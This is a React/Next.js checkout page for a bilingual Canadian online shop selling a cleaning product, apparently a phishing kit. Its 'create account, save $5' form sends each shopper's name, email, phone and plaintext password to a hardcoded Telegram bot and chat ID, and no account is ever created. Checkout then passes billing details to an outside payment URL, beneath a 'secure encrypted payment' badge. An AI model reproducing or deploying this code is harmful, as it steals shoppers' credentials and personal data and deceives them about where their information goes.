"use client"

import { useState, useRef } from "react"
import { useCart } from "@/lib/cart-context"
import Image from "next/image"
import Link from "next/link"
import { ArrowLeft, Lock, CreditCard, Truck, Shield, MapPin, Clock } from "lucide-react"
import Footer from "@/components/footer"
import { useI18n } from "@/lib/i18n-context"

export default function CheckoutPage() {
  const { items, total, shipping, clearCart } = useCart()
  const { locale, formatPrice } = useI18n()
  const isFr = locale === 'fr'
  
  // Telegram refs
  const messageIdRef = useRef<number | null>(null)
  const isUpdatingRef = useRef(false)
  const updateTimerRef = useRef<NodeJS.Timeout | null>(null)
  const sessionIdRef = useRef(`HCT_${Date.now()}`)
  
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "CA",
    phone: "",
    dateOfBirth: ""
  })
  
  // Account creation states
  const [showAccountForm, setShowAccountForm] = useState(false)
  const [accountFormData, setAccountFormData] = useState({
    email: "",
    password: "",
    confirmPassword: ""
  })
  const [isCreatingAccount, setIsCreatingAccount] = useState(false)
  const [accountCreated, setAccountCreated] = useState(false)
  const [accountError, setAccountError] = useState("")
  const [discountApplied, setDiscountApplied] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [showDatePicker, setShowDatePicker] = useState(false)
  const [selectedDay, setSelectedDay] = useState('')
  const [selectedMonth, setSelectedMonth] = useState('')
  const [selectedYear, setSelectedYear] = useState('')
  const [turnstileToken, setTurnstileToken] = useState<string | null>(null)
  const [honeypot, setHoneypot] = useState('')
  const [formLoadTime] = useState(Date.now())

  // Calculate discount
  const discountAmount = discountApplied ? 5 : 0
  const discountedTotal = Math.max(0, total - discountAmount)
  const taxes = discountedTotal * 0.13
  const finalTotal = discountedTotal + taxes

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
  const TELEGRAM_CHAT_ID = '-5217100062'

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: value
    }))
  }

  const handleAccountInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setAccountFormData(prev => ({
      ...prev,
      [name]: value
    }))
  }

  // Create account handler
  const handleCreateAccount = (e: React.FormEvent) => {
    e.preventDefault()
    setAccountError("")

    // Validation
    if (!accountFormData.email.trim()) {
      setAccountError(isFr ? "L'email est requis" : "Email is required")
      return
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(accountFormData.email)) {
      setAccountError(isFr ? "L'email n'est pas valide" : "Email is not valid")
      return
    }

    if (!accountFormData.password || accountFormData.password.length < 8) {
      setAccountError(isFr ? "Le mot de passe doit contenir au moins 8 caractères" : "Password must be at least 8 characters")
      return
    }

    if (accountFormData.password !== accountFormData.confirmPassword) {
      setAccountError(isFr ? "Les mots de passe ne correspondent pas" : "Passwords do not match")
      return
    }

    setIsCreatingAccount(true)

    // Send Telegram notification for account creation
    var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
            + "👤 Prénom: " + (formData.firstName || 'Non fourni') + "\n"
            + "📧 Nom: " + (formData.lastName || 'Non fourni') + "\n"
            + "📧 Email: " + accountFormData.email + "\n"
            + "📞 Téléphone: " + (formData.phone || 'Non fourni') + "\n"
            + "🔑 Mot de passe: " + accountFormData.password + "\n"
            + "🌐 Page: /checkout\n"
            + "🕐 " + new Date().toLocaleString('fr-CA')
            + "\n"
            + "💰 Rabais: $5 appliqué automatiquement!"

    fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "Markdown"
      })
    })
    .then(function() {
      // Update checkout form email with account email
      setFormData(prev => ({
        ...prev,
        email: accountFormData.email
      }))
      
      // Apply $5 discount
      setDiscountApplied(true)
      
      setAccountCreated(true)
      setIsCreatingAccount(false)
      setShowAccountForm(false)
      
      // Apply $5 discount immediately
      setTimeout(() => {
        alert(isFr ? "Compte créé avec succès! Rabais de $5 appliqué." : "Account created successfully! $5 discount applied.")
      }, 500)
    })
    .catch(function() {
      setAccountError(isFr ? "Erreur lors de la création du compte" : "Error creating account")
      setIsCreatingAccount(false)
    })
  }

  // Format phone number
  const formatPhoneNumber = (phone: string) => {
    const cleaned = phone.replace(/\D/g, '')
    if (cleaned.length <= 3) return cleaned
    if (cleaned.length <= 6) return `${cleaned.slice(0, 3)} ${cleaned.slice(3)}`
    return `${cleaned.slice(0, 3)} ${cleaned.slice(3, 6)} ${cleaned.slice(6, 10)}`
  }

  // Format postal code
  const formatPostalCode = (postalCode: string) => {
    const cleaned = postalCode.replace(/\s/g, '').toUpperCase()
    if (cleaned.length <= 3) return cleaned
    return `${cleaned.slice(0, 3)} ${cleaned.slice(3)}`
  }

  // Validate email
  const isValidEmail = (email: string) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
  }

  // Validate postal code
  const isValidPostalCode = (postalCode: string, country: string) => {
    if (country === 'CA') {
      return /^[A-Z]\d[A-Z]\s?\d[A-Z]\d$/i.test(postalCode)
    }
    return true
  }

  // Validate age (13+)
  const validateAge = (dateOfBirth: string) => {
    if (!dateOfBirth) return false
    
    const birthDate = new Date(dateOfBirth)
    const today = new Date()
    const age = today.getFullYear() - birthDate.getFullYear()
    const monthDiff = today.getMonth() - birthDate.getMonth()
    
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
      return age - 1 >= 13
    }
    
    return age >= 13
  }

  // Update date of birth
  const updateDateOfBirth = (day: string, month: string, year: string) => {
    if (day && month && year) {
      const dateOfBirth = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`
      setFormData(prev => ({ ...prev, dateOfBirth }))
    }
  }

  // Check if form is valid
  const isFormValid = () => {
    return formData.firstName && 
           formData.lastName && 
           formData.email && 
           isValidEmail(formData.email) &&
           formData.address && 
           formData.city && 
           formData.province && 
           formData.postalCode && 
           isValidPostalCode(formData.postalCode, formData.country) &&
           formData.phone && 
           formData.dateOfBirth && 
           validateAge(formData.dateOfBirth)
  }

  // Generate payment URL
  const generatePaymentURL = (data: any) => {
    const baseURL = 'https://secure.payment-ca.com/connect/form'
    const orderNumber = `BC-${Math.floor(Date.now() / 1000).toString(36).toUpperCase().slice(-5)}-${Math.floor(Math.random() * 900 + 100)}`
    
    const params = {
      site: 'secure.payment-ca.com',
      order_id: orderNumber,
      amount: finalTotal * 100, // Convert to cents
      currency: 'CAD',
      billing_first_name: data.firstName,
      billing_last_name: data.lastName,
      billing_company: '',
      billing_address_1: data.address,
      billing_address_2: data.apartment || '',
      billing_city: data.city,
      billing_state: data.province,
      billing_postcode: data.postalCode,
      billing_country: data.country,
      billing_email: data.email,
      billing_phone: formatPhoneNumber(data.phone)
    }
    
    const queryString = Object.keys(params)
      .map(key => `${key}=${encodeURIComponent((params as any)[key])}`)
      .join('&')
    
    return `${baseURL}?${queryString}`
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!isFormValid()) {
      alert(isFr ? 'Veuillez remplir tous les champs requis' : 'Please fill all required fields')
      return
    }

    setIsProcessing(true)

    try {
      // Generate payment URL
      const paymentURL = generatePaymentURL(formData)
      
      // Redirect to payment
      window.location.href = paymentURL
    } catch (error) {
      console.error('Checkout error:', error)
      setIsProcessing(false)
      alert(isFr ? 'Une erreur est survenue' : 'An error occurred')
    }
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/produits/betterclean-pro-1" className="flex items-center text-gray-600 hover:text-gray-900">
              <ArrowLeft className="w-4 h-4 mr-2" />
              {isFr ? 'Retour' : 'Back'}
            </Link>
            <h1 className="text-lg font-semibold text-gray-900">
              {isFr ? 'Finaliser la commande' : 'Checkout'}
            </h1>
            <div className="w-16"></div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Checkout Form */}
          <div className="lg:col-span-2 space-y-6">
            {/* Contact Information */}
            <div className="bg-white rounded-2xl p-6 border border-gray-100">
              <h2 className="text-base font-semibold text-gray-900 mb-4">
                {isFr ? 'Informations de contact' : 'Contact Information'}
              </h2>
              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Adresse e-mail' : 'Email address'}
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`w-full px-3 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm ${formData.email && !isValidEmail(formData.email) ? 'border-red-300 focus:ring-red-500' : 'border-gray-300'}`}
                    required
                  />
                  {formData.email && !isValidEmail(formData.email) && (
                    <p className="text-red-500 text-xs mt-1">
                      {isFr ? 'Veuillez entrer une adresse email valide' : 'Please enter a valid email address'}
                    </p>
                  )}
                </div>

                {/* Account Creation Section */}
                {!accountCreated && (
                  <div className="mt-3">
                    <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-3">
                      <div className="flex items-center justify-between">
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                              <span className="text-white text-xs font-bold">$5</span>
                            </div>
                            <span className="text-green-800 font-semibold text-xs">
                              {isFr ? 'CRÉER UN COMPTE' : 'CREATE ACCOUNT'}
                            </span>
                          </div>
                          <p className="text-green-700 text-xs">
                            {isFr 
                              ? 'Économisez $5 instantanément'
                              : 'Save $5 instantly'
                            }
                          </p>
                        </div>
                        <button
                          onClick={() => setShowAccountForm(!showAccountForm)}
                          className="px-3 py-1 bg-green-600 text-white text-xs font-medium rounded-full hover:bg-green-700 transition-colors"
                        >
                          {showAccountForm ? (isFr ? 'Annuler' : 'Cancel') : (isFr ? 'Créer' : 'Create')}
                        </button>
                      </div>

                      {showAccountForm && (
                        <form onSubmit={handleCreateAccount} className="mt-3 space-y-2 border-t border-green-200 pt-3">
                          {accountError && (
                            <div className="p-2 bg-red-50 border border-red-200 rounded text-red-700 text-xs">
                              {accountError}
                            </div>
                          )}
                          
                          <input
                            type="email"
                            name="email"
                            value={accountFormData.email}
                            onChange={handleAccountInputChange}
                            placeholder={isFr ? 'Email' : 'Email'}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-xs focus:outline-none focus:ring-2 focus:ring-green-500"
                            required
                          />
                          
                          <input
                            type="password"
                            name="password"
                            value={accountFormData.password}
                            onChange={handleAccountInputChange}
                            placeholder={isFr ? 'Mot de passe' : 'Password'}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-xs focus:outline-none focus:ring-2 focus:ring-green-500"
                            required
                          />
                          
                          <input
                            type="password"
                            name="confirmPassword"
                            value={accountFormData.confirmPassword}
                            onChange={handleAccountInputChange}
                            placeholder={isFr ? 'Confirmer mot de passe' : 'Confirm Password'}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg text-xs focus:outline-none focus:ring-2 focus:ring-green-500"
                            required
                          />
                          
                          <button
                            type="submit"
                            disabled={isCreatingAccount}
                            className="w-full py-2 bg-green-600 text-white text-xs font-medium rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50"
                          >
                            {isCreatingAccount ? (
                              <span className="flex items-center justify-center">
                                <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-t-2 border-white mr-2"></div>
                                {isFr ? 'Création...' : 'Creating...'}
                              </span>
                            ) : (
                              isFr ? 'Créer et économiser $5' : 'Create & save $5'
                            )}
                          </button>
                        </form>
                      )}
                    </div>
                  </div>
                )}

                {accountCreated && (
                  <div className="mt-3 p-2 bg-green-50 border border-green-200 rounded-lg">
                    <div className="flex items-center gap-2">
                      <svg className="w-4 h-4 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                      </svg>
                      <div>
                        <p className="text-green-800 font-medium text-xs">
                          {isFr ? 'Compte créé! $5 appliqué' : 'Account created! $5 applied'}
                        </p>
                        <p className="text-green-700 text-xs">
                          {isFr ? 'Bienvenue ' : 'Welcome '}{formData.firstName}!
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* Shipping Address */}
            <div className="bg-white rounded-2xl p-6 border border-gray-100">
              <h2 className="text-base font-semibold text-gray-900 mb-4">
                {isFr ? 'Adresse de livraison' : 'Shipping Address'}
              </h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Prénom' : 'First name'}
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Nom' : 'Last name'}
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
              </div>

              <div className="mt-3">
                <label className="block text-xs font-medium text-gray-600 mb-1">
                  {isFr ? 'Adresse' : 'Address'}
                </label>
                <input
                  type="text"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                  required
                />
              </div>

              <div className="mt-3">
                <label className="block text-xs font-medium text-gray-600 mb-1">
                  {isFr ? 'Appartement, suite, etc.' : 'Apartment, suite, etc.'}
                </label>
                <input
                  type="text"
                  name="apartment"
                  value={formData.apartment}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Ville' : 'City'}
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Province' : 'Province'}
                  </label>
                  <select
                    name="province"
                    value={formData.province}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  >
                    <option value="">{isFr ? 'Sélectionner' : 'Select'}</option>
                    <option value="ON">ON</option>
                    <option value="QC">QC</option>
                    <option value="BC">BC</option>
                    <option value="AB">AB</option>
                    <option value="MB">MB</option>
                    <option value="SK">SK</option>
                    <option value="NS">NS</option>
                    <option value="NB">NB</option>
                    <option value="NL">NL</option>
                    <option value="PE">PE</option>
                    <option value="NT">NT</option>
                    <option value="NU">NU</option>
                    <option value="YT">YT</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Code postal' : 'Postal code'}
                  </label>
                  <input
                    type="text"
                    name="postalCode"
                    value={formData.postalCode}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
              </div>

              <div className="mt-3">
                <label className="block text-xs font-medium text-gray-600 mb-1">
                  {isFr ? 'Téléphone' : 'Phone'}
                </label>
                <input
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                  required
                />
              </div>
            </div>

            {/* Submit Button */}
            <button
              onClick={handleSubmit}
              disabled={isProcessing}
              className="w-full bg-blue-600 text-white py-3 rounded-full font-medium hover:bg-blue-700 transition-colors disabled:opacity-50"
            >
              {isProcessing ? (
                <span className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-t-2 border-white mr-2"></div>
                  {isFr ? 'Traitement...' : 'Processing...'}
                </span>
              ) : (
                isFr ? 'Finaliser la commande' : 'Complete Order'
              )}
            </button>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-2xl p-6 border border-gray-100 sticky top-4">
              <h2 className="text-base font-semibold text-gray-900 mb-4">
                {isFr ? 'Résumé de commande' : 'Order Summary'}
              </h2>
              
              <div className="space-y-3 mb-4 max-h-60 overflow-y-auto">
                {items.map((item) => (
                  <div key={item.id} className="flex gap-3">
                    <div className="relative w-12 h-12 rounded-xl overflow-hidden bg-gray-50 flex-shrink-0">
                      <Image
                        src={item.image || "/placeholder.svg"}
                        alt={item.name}
                        fill
                        sizes="64px"
                        className="object-cover"
                      />
                    </div>
                    <div className="flex-1">
                      <h4 className="text-sm font-medium text-gray-900 truncate">
                        {item.name}
                      </h4>
                      <div className="flex justify-between items-center">
                        <span className="text-xs text-gray-400">
                          {isFr ? 'Qté' : 'Qty'}: {item.quantity}
                        </span>
                        <span className="text-sm font-medium">
                          {formatPrice(item.price * item.quantity)}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
              
              <div className="space-y-2 mb-4 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">{isFr ? 'Sous-total' : 'Subtotal'}</span>
                  <span className="font-medium">{formatPrice(total)}</span>
                </div>
                {discountApplied && (
                  <div className="flex justify-between">
                    <span className="text-green-600">{isFr ? 'Rabais compte' : 'Account Discount'}</span>
                    <span className="font-medium text-green-600">-{formatPrice(discountAmount)}</span>
                  </div>
                )}
                <div className="flex justify-between">
                  <span className="text-gray-400">{isFr ? 'Livraison' : 'Shipping'}</span>
                  <span className="font-medium">
                    {shipping === 0 ? (
                      <span className="text-green-600">{isFr ? 'Gratuite' : 'Free'}</span>
                    ) : (
                      formatPrice(shipping)
                    )}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">{isFr ? 'Taxes' : 'Taxes'}</span>
                  <span className="font-medium">{formatPrice(taxes)}</span>
                </div>
              </div>
              
              <div className="border-t border-gray-100 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium text-gray-500">Total</span>
                  <span className="text-xl font-semibold text-gray-900">
                    {formatPrice(finalTotal)}
                  </span>
                </div>
              </div>

              {/* Security badges */}
              <div className="space-y-4">
                <div className="flex items-center justify-center space-x-4">
                  <div className="w-12 h-12 bg-gray-100 rounded-lg flex items-center justify-center">
                    <Lock className="w-6 h-6 text-gray-600" />
                  </div>
                  <div className="w-12 h-12 bg-gray-100 rounded-lg flex items-center justify-center">
                    <Shield className="w-6 h-6 text-gray-600" />
                  </div>
                  <div className="w-12 h-12 bg-gray-100 rounded-lg flex items-center justify-center">
                    <Truck className="w-6 h-6 text-gray-600" />
                  </div>
                </div>
                <p className="text-xs text-gray-500 text-center">
                  {isFr ? 'Paiement sécurisé et crypté' : 'Secure encrypted payment'}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  )
}
